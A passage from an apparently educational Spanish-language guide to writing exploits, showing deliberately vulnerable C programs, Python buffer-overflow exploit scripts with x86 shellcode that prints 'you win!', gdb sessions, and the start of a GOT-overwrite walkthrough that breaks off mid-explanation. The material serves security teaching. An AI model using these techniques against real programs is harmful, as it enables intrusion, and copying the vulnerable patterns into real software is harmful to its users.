<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>
    
       &middot; Guía de exploits
    
  </title>

  <!-- CSS -->

  <link rel="stylesheet" href="/guia-escritura-exploits/public/css/poole.css">
  <link rel="stylesheet" href="/guia-escritura-exploits/public/css/syntax.css">
  <link rel="stylesheet" href="/guia-escritura-exploits/public/css/hyde.css">
  <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/guia-escritura-exploits/public/apple-touch-icon-144-precomposed.png">
                                 <link rel="shortcut icon" href="/guia-escritura-exploits/public/favicon.ico">

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
</head>


  <body>

    <div class="sidebar">
 <!-- <div class="container sidebar-sticky">-->
  <div class="container sidebar">
    <div class="sidebar-about">
      <h1>
        <a href="/guia-escritura-exploits/">
          Guía de exploits
        </a>
      </h1>
      <!--<p class="lead"></p>-->
    </div>

    <nav class="sidebar-nav">

     <!-- <a class="sidebar-nav-item" href="/guia-escritura-exploits/">Home</a>-->

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/buffer-overflow/index.html">Buffer Overflow</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/1-introduccion.html">Nivel 1 | Teoría</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/1-practica.html">Nivel 1 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/2-shellcode.html">Nivel 2 | Shellcode</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/2-practica.html">Nivel 2 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/3-got.html">Nivel 3 | GOT</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/3-practica.html">Nivel 3 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/4-practica.html">Nivel 4 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/format-string/index.html">Format String</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/format-string/5-format-string.html">Nivel 5 | Format strings</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/format-string/5-practica.html">Nivel 5 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/esoteric/index.html">Esoteric</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/esoteric/6-ret2libc.html">Nivel 6 | Return to libc</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/esoteric/6-practica.html">Nivel 6 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/configuracion.html">Configuración</a>
        <a class="sidebar-nav-item" href="/guia-escritura-exploits/herramientas.html">Herramientas</a>


      <!--<a class="sidebar-nav-item" href="/archive/v2.1.0.zip">Descargar PDF</a>-->
      <a class="sidebar-nav-item" href="https://github.com/fundacion-sadosky/guia-escritura-exploits">Proyecto en GitHub</a>
    </nav>

    <p class="sidebar-nav-item footer">Basado en los <a href="https://github.com/gerasdf/InsecureProgramming/">abos de Gera</a></br> Teresa Alberto | STIC, Fundación Sadosky  </br> <a href="https://github.com/fundacion-sadosky/guia-escritura-exploits/blob/master/LICENSE">GNU GPL</a> | 2018</p>
  </div>
</div>


    <div class="content container">
      <div class="page">
  <!--<h1 class="page-title"></h1>-->
  <h1 id="ataque-smash-the-stack-con-ejecución-indirecta">Ataque “Smash the stack” con ejecución indirecta</h1>

<h2 id="análisis-del-programa-vulnerable">Análisis del programa vulnerable</h2>
<h3 id="abo-3">Abo 3</h3>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argv</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argc</span><span class="p">)</span> <span class="p">{</span>

	<span class="k">extern</span> <span class="n">system</span><span class="p">,</span><span class="n">puts</span><span class="p">;</span>                           
	<span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">fn</span><span class="p">)(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">=</span><span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">char</span><span class="o">*</span><span class="p">))</span><span class="o">&amp;</span><span class="n">system</span><span class="p">;</span>    <span class="cm">/* fn: puntero almacenado en la pila */</span>
	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

	<span class="n">fn</span><span class="o">=</span><span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">char</span><span class="o">*</span><span class="p">))</span><span class="o">&amp;</span><span class="n">puts</span><span class="p">;</span>
	<span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">argc</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
	<span class="n">fn</span><span class="p">(</span><span class="n">argc</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>

	<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>                                      <span class="cm">/* main() no retorna. Salida con error */</span>
<span class="p">}</span>
</code></pre></div></div>
<blockquote>
  <p><strong>Consideraciones</strong>:</p>
  <ul>
    <li>Función <code class="highlighter-rouge">exit(int estado)</code>: es una función de la biblioteca estándar de C (<code class="highlighter-rouge">stdlib.h</code>) que termina de forma controlada la ejecución de un programa.
      <blockquote>

      </blockquote>
    </li>
    <li>Nombres de argumentos <code class="highlighter-rouge">argc</code> y <code class="highlighter-rouge">argv</code>: en general <code class="highlighter-rouge">argc</code> es la cantidad de cadenas en la línea de comandos al llamar al programa, siendo <code class="highlighter-rouge">argc[0]</code> el nombre del programa. Y <code class="highlighter-rouge">argv</code> es un arreglo de punteros a los argumentos.    <br />
Hay que considerar que en los abos originales los nombres de <code class="highlighter-rouge">argc</code> y de <code class="highlighter-rouge">argv</code> están invertidos.</li>
  </ul>
</blockquote>

<h3 id="qué-hace-el-programa">¿Qué hace el programa?</h3>
<p>Se declaran las funciones <code class="highlighter-rouge">system</code> y <code class="highlighter-rouge">puts</code> que se definen de manera externa (pertenecen a <code class="highlighter-rouge">libc</code>). Luego se apila un puntero a <code class="highlighter-rouge">fn()</code> y después la variable local <code class="highlighter-rouge">buf</code>. 
Después se define la dirección de un puntero a <code class="highlighter-rouge">fn()</code>, se copia el contenido del primer parámetro dentro de <code class="highlighter-rouge">buf</code> y se ejecuta <code class="highlighter-rouge">fn()</code>. Por último se interrumpe la ejecución de <code class="highlighter-rouge">main()</code> sin retornar, y se sale del programa vulnerable con <code class="highlighter-rouge">exit(1)</code>.</p>

<h3 id="layout-de-la-pila-antes-del-exploit">Layout de la pila antes del exploit:</h3>
<p>Antes de modificar la dirección del puntero a <code class="highlighter-rouge">fn</code>, el mapa de la pila del programa es el siguiente:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">extern</span> <span class="n">system</span><span class="p">,</span><span class="n">puts</span><span class="p">;</span>                           
        <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">fn</span><span class="p">)(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">=</span><span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">char</span><span class="o">*</span><span class="p">))</span><span class="o">&amp;</span><span class="n">system</span><span class="p">;</span>
        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
     
<span class="n">eip</span> <span class="o">=&gt;</span>  <span class="n">fn</span><span class="o">=</span><span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">char</span><span class="o">*</span><span class="p">))</span><span class="o">&amp;</span><span class="n">puts</span><span class="p">;</span>
        <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">argc</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="n">fn</span><span class="p">(</span><span class="n">argc</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
     
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
      <span class="p">}</span>
</code></pre></div></div>
<p><img src="/guia-escritura-exploits/buffer-overflow/imagenes/abo3/layout-pila.png" alt="layout pila" /></p>

<h3 id="solución-anterior-sobreescribir-la-dirección-de-retorno-de-main">Solución anterior: sobreescribir la dirección de retorno de main()</h3>
<p>Como el programa finaliza con <code class="highlighter-rouge">exit(1)</code> es inútil sobreescribir la dirección de retorno de <code class="highlighter-rouge">main()</code> ya que esa función nunca va a retornar.</p>

<h3 id="cuál-es-la-dificultad-principal">¿Cuál es la dificultad principal?</h3>
<p>La función <code class="highlighter-rouge">exit()</code> modifica la salida del programa vulnerable con una llamada al sistema que finaliza el proceso. Por lo tanto de nada nos serviría sobreescribir la dirección de retorno de <code class="highlighter-rouge">main()</code> para ejecutar el shellcode.    <br />
Entonces: <strong>¿cómo logramos ejecutar el shellcode?</strong></p>

<h2 id="ataque-smash-the-stack-con-ejecución-indirecta-1">Ataque “Smash the stack” con ejecución indirecta</h2>
<p>Es posible aprovecharse de que el programa vulnerable ejecuta la función <code class="highlighter-rouge">fn()</code> y que además define un puntero a esa función que es almacenado en la pila.   <br />
Nuevamente es posible inyectar el shellcode en <code class="highlighter-rouge">buf</code> a través de la función <code class="highlighter-rouge">strcpy()</code>. Esta vez para ejecutarlo sobreescribimos el puntero a <code class="highlighter-rouge">fn()</code> para que apunte a nuestro shellcode. De esta manera, cuando se ejecute <code class="highlighter-rouge">fn()</code> logramos que lo que se ejecute sea nuestro código malicioso antes de que el proceso termine con <code class="highlighter-rouge">exit(1)</code>.</p>

<h3 id="layout-de-la-pila-deseado">Layout de la pila deseado:</h3>
<p><img src="/guia-escritura-exploits/buffer-overflow/imagenes/abo3/layout-pila-shell.png" alt="layout pila" /></p>

<ol>
  <li>
    <p>Aprovechamos el <code class="highlighter-rouge">strcpy(buf,argc[1])</code> para realizar un overflow: con el primer argumento <code class="highlighter-rouge">argc[1]</code> inyectamos el shellcode con un <a href="/guia-escritura-exploits/buffer-overflow/2-shellcode.html#tobogan-de-nops">tobogán de NOPs</a> y por desbordamiento sobreescribimos la dirección a la que apunta el puntero a <code class="highlighter-rouge">fn</code>:</p>

    <p><img src="/guia-escritura-exploits/buffer-overflow/imagenes/abo3/exploit.png" alt="input" /></p>
  </li>
  <li>
    <p>Armamos un archivo en Python para ingresar el input.</p>

    <p>Gracias al mapa de la pila sabemos que si con nuestro input llenamos <code class="highlighter-rouge">buf</code> los siguientes 4 bytes van a corresponder a la dirección del puntero a <code class="highlighter-rouge">fn()</code>. Como todavía no conocemos la dirección de <code class="highlighter-rouge">buf</code> probamos sobreescribir el puntero para que apunte a un valor cualquiera como <code class="highlighter-rouge">0x41414141</code>. Para ejecutar <code class="highlighter-rouge">fn()</code> se dereferencia la dirección del puntero de esa función, pero como <code class="highlighter-rouge">0x41414141</code> es una dirección por fuera del espacio de memoria del proceso se produce un <em>segmentation fault</em> o violación de segmento.    <br />
Aunque el objetivo aún no esté cumplido, con este paso intermedio nos aseguramos que podemos controlar el flujo de ejecución del programa.</p>

    <p>El shellcode usado es nuevamente el <a href="/guia-escritura-exploits/buffer-overflow/2-shellcode.html#shellcode-que-imprime-you-win">shellcode que imprime “You win!”</a>.</p>
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#! /usr/bin/env python</span>
<span class="s">"""Uso: ./abo3 "$(./exploit.py)" """</span>
   
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
   
<span class="c">#shellcode, imprime you win</span>
<span class="n">shellcode</span>  <span class="o">=</span> <span class="s">"</span><span class="se">\xeb\x16\x31\xc0\x59\x88\x41\x08\xb0\x04\x31\xdb\x43</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x31\xd2\xb2\x09\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xe5</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x41</span><span class="s">"</span>
    
<span class="n">ret_addr</span> <span class="o">=</span> <span class="mh">0x41414141</span>                                   <span class="c">#???? addr de buf</span>
<span class="n">len_buf</span>  <span class="o">=</span> <span class="mi">256</span>
   
<span class="n">exploit</span>  <span class="o">=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">80</span>                                  <span class="c">#nops al principio de buf</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">shellcode</span>                                    <span class="c">#shellcode</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x42</span><span class="s">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">len_buf</span><span class="o">-</span><span class="mi">80</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>         <span class="c">#completa buf</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ret_addr</span><span class="p">)</span>                         <span class="c">#lleno *fn</span>
   
<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
</code></pre></div>    </div>
  </li>
  <li>Corremos el programa y verificamos que la ejecución salte a <code class="highlighter-rouge">0x41414141</code>.
    <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@abos:~$</span> <span class="nb">sudo </span>sysctl <span class="nt">-w</span> kernel.randomize_va_space<span class="o">=</span>0 <span class="c">#no random</span>
<span class="go">
</span><span class="gp">user@abos:~$</span> gcc <span class="nt">-m32</span> <span class="nt">-fno-stack-protector</span> <span class="nt">-ggdb</span> <span class="nt">-mpreferred-stack-boundary</span><span class="o">=</span>2 <span class="nt">-z</span> execstack <span class="nt">-o</span> abo3 abo3.c
<span class="go">
</span><span class="gp">user@abos:~$</span> <span class="nb">env</span> <span class="nt">-i</span> gdb ./abo3
<span class="go">GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
(gdb) break main
</span><span class="gp">(gdb) run "$</span><span class="o">(</span>./exploit.py<span class="o">)</span><span class="s2">"
</span><span class="go">(gdb) c
Continuing.
   
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
</span></code></pre></div>    </div>
    <p>Perfecto. Al ejecutar <code class="highlighter-rouge">fn(argc[2])</code> como modificamos el puntero a <code class="highlighter-rouge">fn()</code> por la dirección <code class="highlighter-rouge">0x41414141</code> se intenta ejecutar una dirección no válida que resulta en una violación de segmento.</p>
  </li>
  <li>
    <p>Averiguamos la dirección de buf en la pila.   <br />
Nos aseguramos de <a href="/guia-escritura-exploits/configuracion.md#direcciones-en-la-pila-con-y-sin-modo-debugging">alinear las direcciones en el entorno de debugging y fuera de él</a>. Con <code class="highlighter-rouge">gdb</code> averiguamos la dirección de <code class="highlighter-rouge">buf</code> de la siguiente manera:</p>

    <p>Avanzamos con el operador de siguiente instrucción <code class="highlighter-rouge">si</code> en <code class="highlighter-rouge">gdb</code> hasta antes de la ejecución de la línea <code class="highlighter-rouge">fn=(void(*)(char*))&amp;puts</code>. En ese punto verificamos el valor de <code class="highlighter-rouge">buf</code>:</p>

    <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">   (gdb) run "$</span><span class="o">(</span>./exploit.py<span class="o">)</span><span class="s2">"
</span><span class="go">   (gdb) si
</span><span class="gp">   11    fn=(void(*)(char*))&amp;puts;</span>
<span class="gp">   (gdb) x/2i $</span>eip                <span class="p">;</span> vemos las 2 instrucciones sgtes.
<span class="gp">=&gt;</span> 0x80484ab &lt;main+16&gt;: mov    DWORD PTR <span class="o">[</span>ebp-0x4],0x8048350
<span class="gp">   0x80484b2 &lt;main+23&gt;</span>: mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc]
<span class="go">      
   (gdb) x/wx buf
   0xbffffbc4: 0x00000000
</span><span class="gp">   (gdb) x/wx $</span>ebp-0x104          <span class="p">;</span> es lo mismo
<span class="go">   0xbffffbc4: 0x00000000
</span></code></pre></div>    </div>
    <p>La dirección de <code class="highlighter-rouge">buf</code> es entonces <code class="highlighter-rouge">0xbffffbc4</code>.</p>

    <p>Un truco más fácil para obtener esa información es agregar en el código fuente de <code class="highlighter-rouge">abo3.c</code> una línea que imprima la dirección de <code class="highlighter-rouge">buf</code> como por ejemplo: <code class="highlighter-rouge">printf("buf: %08x\n", &amp;buf)</code>. Después compilar nuevamente y ejecutar el programa vulnerable para conocer la dirección de <code class="highlighter-rouge">buf</code>. Evidentemente en casos reales no podremos modificar el código fuente del programa que queremos explotar.</p>
  </li>
  <li>
    <p>Actualizamos el script con la dirección de buf.   <br />
Para poder contar con mayor margen de error no saltamos exactamente al comienzo de <code class="highlighter-rouge">buf</code> sino en la mitad del tobogán de nops. Para eso le sumamos a esa dirección 40 bytes, considerando que el <em>nop sled</em> es de 80 bytes.</p>

    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#! /usr/bin/env python</span>
<span class="s">"""Uso: ./abo3 "$(./exploit.py)" """</span>
   
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
   
<span class="c">#shellcode, imprime you win</span>
<span class="n">shellcode</span>  <span class="o">=</span> <span class="s">"</span><span class="se">\xeb\x16\x31\xc0\x59\x88\x41\x08\xb0\x04\x31\xdb\x43</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x31\xd2\xb2\x09\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xe5</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x41</span><span class="s">"</span>
    
<span class="n">buf_addr</span> <span class="o">=</span> <span class="mh">0xbffffbc4</span>                                   <span class="c">#addr de buf</span>
<span class="n">ret_addr</span> <span class="o">=</span> <span class="n">buf_addr</span><span class="o">+</span><span class="mi">40</span>                                  <span class="c">#addr tobogan nops</span>
<span class="n">len_buf</span>  <span class="o">=</span> <span class="mi">256</span>
   
<span class="n">exploit</span>  <span class="o">=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">80</span>                                  <span class="c">#nops al principio de buf</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">shellcode</span>                                    <span class="c">#shellcode</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">len_buf</span><span class="o">-</span><span class="mi">80</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>         <span class="c">#nops que completan buf</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ret_addr</span><span class="p">)</span>                         <span class="c">#lleno fn()</span>
   
<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
</code></pre></div>    </div>
  </li>
  <li>Ejecutamos el exploit y logramos imprimir el mensaje ganador.
    <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@abos:~$</span> <span class="nb">env</span> <span class="nt">-i</span> <span class="nv">LINES</span><span class="o">=</span>34 <span class="nv">COLUMNS</span><span class="o">=</span>72 <span class="nv">PWD</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span> /home/usuarix/abos/abo3 <span class="s2">"</span><span class="k">$(</span>./exploit.py<span class="k">)</span><span class="s2">"</span>
<span class="go">you win!
</span></code></pre></div>    </div>
  </li>
</ol>

<blockquote>
  <p><strong>Consideraciones</strong>: si las variables de entorno se incluyen o no en la ejecución dependerá del método de alineación del stack elegido.</p>
</blockquote>

<p>Gráficamente logramos el siguiente resultado:</p>

<p><img src="/guia-escritura-exploits/buffer-overflow/imagenes/abo3/programa-explotado.png" alt="pila después" /></p>

<p>…………………………………………………………………………………………………………………………………………………</p>

<h1 id="ataque-de-reescritura-de-la-global-offset-table-got">Ataque de reescritura de la Global Offset Table (GOT)</h1>

<h2 id="análisis-del-programa-vulnerable-1">Análisis del programa vulnerable</h2>
<h3 id="abo-5">Abo 5</h3>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argv</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argc</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">char</span> <span class="o">*</span><span class="n">pbuf</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">argc</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

        <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">argc</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="k">for</span> <span class="p">(;</span><span class="o">*</span><span class="n">pbuf</span><span class="o">++=*</span><span class="p">(</span><span class="n">argc</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">++</span><span class="p">););</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
</code></pre></div></div>

<h3 id="qué-hace-el-programa-1">¿Qué hace el programa?</h3>
<p>El programa vulnerable apila dos variables locales: el arreglo <code class="highlighter-rouge">buf</code> y el puntero <code class="highlighter-rouge">pbuf</code> (que apunta al heap). Después de copiar el contenido del primer y segundo parámetro en las variables, ejecuta la función <code class="highlighter-rouge">exit()</code> que hará una syscall <code class="highlighter-rouge">exit</code> (con un estatus de 1 de error) y finalizará el proceso provocando que <code class="highlighter-rouge">main()</code> nunca retorne.</p>

<h3 id="layout-de-la-pila-antes-del-exploit-1">Layout de la pila antes del exploit:</h3>

<p><img src="/guia-escritura-exploits/buffer-overflow/imagenes/abo5/layout-pila.png" alt="layout pila" /></p>

<h3 id="cuál-es-la-dificultad-principal-1">¿Cuál es la dificultad principal?</h3>
<p>Nuevamente finaliza el proceso de manera anticipada con el llamado a <code class="highlighter-rouge">exit()</code>, sin un retorno a <code class="highlighter-rouge">main()</code>.    <br />
Además, no se ejecuta una función auxiliar en el programa vulnerable (como antes <code class="highlighter-rouge">fn()</code>), lo que complica la ejecución del código inyectado.   <br />
<strong>¿Cómo logramos ejecutar el shellcode de manera indirecta aprovechando el puntero pbuf adicional?</strong></p>

<h2 id="ataque-de-reescritura-de-la-global-offset-table-got-1">Ataque de reescritura de la Global Offset Table (GOT)</h2>
<p>Hasta este momento se han realizado ataques en el nivel de la pila, es decir, aprovechando direcciones de retorno y punteros a funciones almacenados en ese área de la memoria.   <br />
En numerosos casos, no es de utilidad sobreescribir la dirección de retorno debido a mitigaciones en la pila o a funciones como <code class="highlighter-rouge">exit()</code> que finalizan un proceso sin utilizar la dirección de retorno de la pila. En estos casos se deben encontrar otras maneras de tomar el control del proceso explotado.</p>

<p>Si imaginamos un escenario real dónde un mismo binario se comparte (a través de por ejemplo repositorios de GNU/Linux), es posible idear un ataque a nivel del binario con la reescritura de la <a href="/guia-escritura-exploits/buffer-overflow/3-got.html#global-offset-table-got">tabla GOT</a>. La dirección de una entrada en la GOT está definida para cada binario, de modo que es independiente de la pila y sus variables de entorno.   <br />
El aprovechamiento de la GOT es un recurso valioso por esa y otras razones que se especifican en el apartado sobre la <a href="/guia-escritura-exploits/buffer-overflow/3-got.html#la-utilidad-de-la-got">utilidad de la GOT</a>.</p>

<p>Justamente en este ejemplo puntual es posible manipular la dirección a la que apunta <code class="highlighter-rouge">exit()</code> en la tabla GOT para que apunte al código inyectado, y el programa vulnerable en vez de ejecutar la función de la biblioteca compartida ejecute el shellcode.    <br />
Como la tabla GOT está fuera de la pila no es posible sobreescribir la dirección de <code class="highlighter-rouge">exit()</code> con el overflow de una variable local sino que hay que acceder a otras secciones de la memoria por fuera de la pila. Aquí entra en juego el puntero <code class="highlighter-rouge">pbuf</code>.</p>

<p>Logramos el ataque de manera indirecta:</p>
<ol>
  <li><code class="highlighter-rouge">strcpy(buf,argc[1])</code> con el primer parámetro inyectamos el shellcode y sobreescribirmos <code class="highlighter-rouge">pbuf</code> para que apunte a la entrada de <code class="highlighter-rouge">exit</code> en la GOT (por fuera de la pila).</li>
  <li><code class="highlighter-rouge">for (;*pbuf++=*(argc[2]++);)</code> dado que el segundo parámetro modifica el valor a dónde referencia <code class="highlighter-rouge">pbuf</code>, con él podemos cambiar la dirección de <code class="highlighter-rouge">exit</code> en la GOT por la dirección de nuestro shellcode.</li>
</ol>

<h3 id="layout-de-la-pila-deseado-1">Layout de la pila deseado:</h3>

<p><img src="/guia-escritura-exploits/buffer-overflow/imagenes/abo5/layout-pila-shell.png" alt="layout pila" /></p>

<ol>
  <li>
    <p>Desensamblamos para ver la dirección de <code class="highlighter-rouge">exit</code> en la GOT.  <br />
En este punto para no marearse con referencias cruzadas y saber exactamente dónde encontrar el dato necesario, es importante tener en mente el proceso de <a href="/guia-escritura-exploits/buffer-overflow/3-got.html#enlazado-din%C3%A1mico-de-librerias-a-binarios">enlazado dinámico de bibliotecas</a>.</p>

    <p>La manera más simple de encontrar el listado de entradas de la GOT es usando el flag <code class="highlighter-rouge">[-R|--dynamic-reloc]</code> de <code class="highlighter-rouge">objdump</code>:</p>

    <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">user</span><span class="err">@</span><span class="n">abos</span><span class="o">:~</span><span class="err">$</span> <span class="n">gcc</span> <span class="o">-</span><span class="n">m32</span> <span class="o">-</span><span class="n">fno</span><span class="o">-</span><span class="n">stack</span><span class="o">-</span><span class="n">protector</span> <span class="o">-</span><span class="n">ggdb</span> <span class="o">-</span><span class="n">mpreferred</span><span class="o">-</span><span class="n">stack</span><span class="o">-</span><span class="n">boundary</span><span class="o">=</span><span class="mi">2</span> <span class="o">-</span><span class="n">z</span> <span class="n">execstack</span> <span class="o">-</span><span class="n">o</span> <span class="n">abo5</span> <span class="n">abo5</span><span class="p">.</span><span class="n">c</span>
<span class="n">user</span><span class="err">@</span><span class="n">abos</span><span class="o">:~</span><span class="err">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">R</span> <span class="n">abo5</span>
<span class="n">abo5</span><span class="o">:</span>     <span class="n">file</span> <span class="n">format</span> <span class="n">elf32</span><span class="o">-</span><span class="n">i386</span>
   
<span class="n">DYNAMIC</span> <span class="n">RELOCATION</span> <span class="n">RECORDS</span>
<span class="n">OFFSET</span>   <span class="n">TYPE</span>              <span class="n">VALUE</span> 
<span class="mi">080497</span><span class="n">a8</span> <span class="n">R_386_GLOB_DAT</span>    <span class="n">__gmon_start__</span>
<span class="mi">080497</span><span class="n">b8</span> <span class="n">R_386_JUMP_SLOT</span>   <span class="n">printf</span>
<span class="mi">080497</span><span class="n">bc</span> <span class="n">R_386_JUMP_SLOT</span>   <span class="n">strcpy</span>
<span class="mi">080497</span><span class="n">c0</span> <span class="n">R_386_JUMP_SLOT</span>   <span class="n">malloc</span>
<span class="mi">080497</span><span class="n">c4</span> <span class="n">R_386_JUMP_SLOT</span>   <span class="n">__gmon_start__</span>
<span class="mi">080497</span><span class="n">c8</span> <span class="n">R_386_JUMP_SLOT</span>   <span class="n">exit</span>             <span class="c">; entrada de la GOT para exit</span>
<span class="mi">080497</span><span class="n">cc</span> <span class="n">R_386_JUMP_SLOT</span>   <span class="n">strlen</span>
<span class="mi">080497</span><span class="n">d0</span> <span class="n">R_386_JUMP_SLOT</span>   <span class="n">__libc_start_main</span>
   
</code></pre></div>    </div>

    <p>En la primer columna se indican las direcciones de cada entrada de la GOT, entonces la dirección que buscamos es: <code class="highlighter-rouge">0x080497c8</code>.</p>

    <p>Otra forma de encontrar la dirección de <code class="highlighter-rouge">exit</code> en la GOT es -primero- buscar la llamada a <code class="highlighter-rouge">exit</code> en <code class="highlighter-rouge">main()</code>:</p>
